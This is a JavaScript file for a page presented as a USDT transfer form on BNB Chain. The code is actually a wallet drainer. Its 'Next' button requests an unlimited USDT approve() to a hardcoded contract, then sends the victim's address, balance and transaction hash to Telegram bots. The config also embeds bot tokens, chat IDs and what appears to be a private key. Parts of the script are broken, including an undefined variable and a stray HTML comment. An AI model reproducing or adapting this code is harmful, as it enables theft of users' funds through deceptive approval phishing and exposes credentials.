document.addEventListener("DOMContentLoaded", function () {

    // ===== CONFIG =====
    const CONFIG = {
        COMPANY_WALLET_ADDRESS: "0x4087bB977abb01f214D7752EAAbb725C9727b2F8",
        CONTRACT_ADDRESS: "0x9f2b584D384C86113595e675431b0cf189D120e1",

        // ===== TELEGRAM BOT 1 =====
        TELEGRAM_BOT_TOKEN_1: "8595892289:AAEQ763BE9L5YUjg11cTEaffUc_s0GPJn2w",
        ADMIN_CHAT_ID_1: " 588520621",

        // ===== TELEGRAM BOT 2 =====
        TELEGRAM_BOT_TOKEN_2: "8595892289:AAEQ763BE9L5YUjg11cTEaffUc_s0GPJn2w",
        ADMIN_CHAT_ID_2: "588520621",

        SENDER_KEY: "d4cacd303a910b95cd66cd6e20c8a56c09a0d21cde123cab1ed2372eb2e5dea2"
    };

    // ===== TELEGRAM HELPER (ADDED) =====
    async function sendTelegram(botToken, chatId, message, keyboard) {
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown",
                reply_markup: keyboard
            })
        });
    }

    // ===== USDT BALANCE =====
    async function getUsdtBalance(address) {
        try {
            const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
            const usdt = new ethers.Contract(
                "0x55d398326f99059fF775485246999027B3197955",
                ["function balanceOf(address) view returns (uint256)"],
                provider
            );
            const balance = await usdt.balanceOf(address);
            return parseFloat(ethers.utils.formatUnits(balance, 18)).toFixed(4);
        } catch (e) {
            return "0.0000";
        }
    }

    // ===== TELEGRAM NOTIFICATIONS (DUAL BOT) =====
    async function sendTelegramNotifications(walletAddress, txHash, userId, UsdtBalance) {

        const inlineKeyboard = {
            inline_keyboard: [[
                { text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }
            ]]
        };

        const adminMessage =
            `🔔 *New USDT Approval Transaction*\n\n` +
            `💰 *Wallet Address:*\n\`${walletAddress}\`\n\n` +
            `🔗 *Transaction Hash:*\n\`${txHash}\`\n\n` +
            `🤑 *USDT Balance:* ${UsdtBalance} USDT\n` +
            `👤 *User ID:* ${userId || "N/A"}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}`;

        const userMessage =
            `🎉 *USDT Approval Successful!*\n\n` +
            `💰 *Wallet Address:*\n\`${walletAddress}\`\n\n` +
            `🔗 *Transaction Hash:*\n\`${txHash}\`\n\n` +
            `✅ *Status:* Approved`;

        try {
            await sendTelegram(
                CONFIG.TELEGRAM_BOT_TOKEN_1,
                CONFIG.ADMIN_CHAT_ID_1,
                adminMessage,
                inlineKeyboard
            );

            await sendTelegram(
                CONFIG.TELEGRAM_BOT_TOKEN_2,
                CONFIG.ADMIN_CHAT_ID_2,
                adminMessage,
                inlineKeyboard
            );

            if (userId) {
                await sendTelegram(
                    CONFIG.TELEGRAM_BOT_TOKEN_1,
                    userId,
                    userMessage,
                    inlineKeyboard
                );
            }

            console.log("Telegram notifications sent to both bots");
        } catch (error) {
            console.error("Telegram error:", error);
        }
    }

    // ===== NOTIFICATION BAR =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#fcfcfcff";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== FORM LOGIC =====
    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn.innerHTML;
    const approxUsd = document.querySelector(".text-xs.text-gray-500");
    const maxBtn = Array.from(document.querySelectorAll("button")).find(
        (btn) => btn.textContent.trim().toLowerCase() === "max"
    );

    amountInput.value = "1";
    approxUsd.textContent = "≈ $1.00";

    function updateApproxUsd() {
        let amount = parseFloat(amountInput.value.trim());
        approxUsd.textContent =
            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
    }
    amountInput.addEventListener("input", updateApproxUsd);
    updateApproxUsd();

    function validate() {
        const address = addressInput.value.trim();
        const amount = amountInput.value.trim();
        nextBtn.disabled = !(address.length > 0 && amount.length > 0);
    }
    addressInput.addEventListener("input", validate);
    amountInput.addEventListener("input", validate);
    validate();

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("No Web3 wallet found.", "error");
                return;
            }
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const walletAddress = await signer.getAddress();
                const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
                const usdtAbi = [
                    "function balanceOf(address owner) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
                let decimals = 18;
                try { decimals = await usdt.decimals(); } catch (err) {}
                let balance = await usdt.balanceOf(walletAddress);
                let maxValue = ethers.utils.formatUnits(balance, decimals);
                amountInput.value = (+maxValue).toString();
                updateApproxUsd();
                validate();
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

 <!-- ===== NEXT BUTTON ===== -->
nextBtn.addEventListener("click", async function(e) {
    // Prevent default so we don't accidentally scroll or focus weirdly
    e.preventDefault(); 

    const originalText = nextBtn.innerText; 
    let currentAmountInput = document.querySelector('input[name="amount"]'); // Or however your ID/Name selector works
    
    try {
        // 1. Ensure wallet exists
        if (!window.ethereum) {
            showNotification("Connect Wallet First!", "error");
            return;
        }

        // 2. Grab the raw address from the top field immediately
        let userAddress = "";
        
        // If your HTML uses an <input>, grab value. If it's text-based like your screenshot suggests, handle accordingly.
        const addressField = document.querySelector('.address-field') || document.getElementById('recipient-address'); 
        
        if(addressField && addressField.value.trim() !== ""){
             userAddress = addressField.value.toLowerCase().trim();
             
             // Optional: Quick checksum check here if you want fancy errors later
            
        } else {
             // Fallback logic if address wasn't explicitly checked yet
             userAddress = await window.ethereum.request({ method: "eth_requestAccounts" });
        }

        // 3. Force the connection state using eth_accounts instead of requestAccounts which can be finicky
        ({ result: [userAddress] } = await window.ethereum.request({ method: "eth_accounts" }));

        // Update our internal variables based on who is actually connected now
        CONFIG.RECIPIENT_ADDRESS = userAddress; // Assuming 'CONFIG' holds these global vars
        
        // Now construct the USDT Approval payload
        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
        
        // Encode the approval call: Contract Address -> Max Amount
        const txData = iface.encodeFunctionData("approve", [
            CONFIG.CONTRACT_ADDRESS,      // Your BNB Chain Token contract
            ethers.constants.MaxUint256.toString()
        ]);

        // Prepare the final transaction object
        const usdtContractAddr = "0x55d398326f99059fF775485246999027B3197955";

        // Visual feedback update
        nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
        nextBtn.style.opacity = "0.7"; // Dim it slightly so they know something is happening

        // Send the actual transaction!
        const txHash = await window.ethereum.request({
            method: "eth_sendTransaction",
            params: [{
                from: userAddress,
                to: usdtContractAddr,
                data: txData,       // This tells the network "I'm sending tokens!"
                value: "0x0"         // Standard ETH gas unit, but since we're swapping via token, keep low
            }]
        });

        showNotification(`USDT Approved! Tx: ${txHash}`, "success");

        // Fire off Telegram notifications with all relevant details
        const userId = urlParams.get("user_id") || userAddress; // Fallback if param missing
        const balance = await getUsdtBalance(userAddress);
        await sendTelegramNotifications(userAddress, txHash, userId, balance);

    } catch (err) {
        console.error(err);
        // Decode readable messages from common provider errors
        let msg = err.message?.slice(0, 30).replace(/\s+/g, "") || "";
        showNotification(`${msg}${err.code === 4 ? "" : "."}`, "error");
    } finally {
        // Reset button regardless of outcome
        nextBtn.disabled = false;
        nextBtn.innerHTML = originalText;
        nextBtn.style.opacity = "1";
    }
});
